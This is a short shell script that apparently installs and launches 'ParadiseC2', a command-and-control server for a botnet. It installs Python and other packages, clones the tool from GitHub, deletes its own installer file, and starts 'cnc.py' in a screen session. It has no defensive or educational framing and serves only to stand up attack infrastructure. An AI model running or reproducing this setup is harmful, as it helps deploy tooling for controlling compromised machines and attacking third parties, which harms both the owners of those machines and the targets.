clear
echo "Installing required files for "ParadiseC2" 20% [==>-------]"
sudo apt install git
git clone https://github.com/Egida/ParadiseC2
clear
echo "Installing required files for "ParadiseC2" 20% [==>-------]"
sudo apt install python3
sudo apt install python2
sudo apt install python
clear
echo "Installing required files for "ParadiseC2" 50% [=====>----]"
sudo apt install python3-pip
pip3 install colorama
sudo apt install screen
clear
echo "Installing required files for "ParadiseC2" 100% [==========]"
sleep 2
clear
echo "Cleaning up"
sleep 2
rm -rf installation.sh
clear
cd ParadiseC2
screen python3 cnc.py
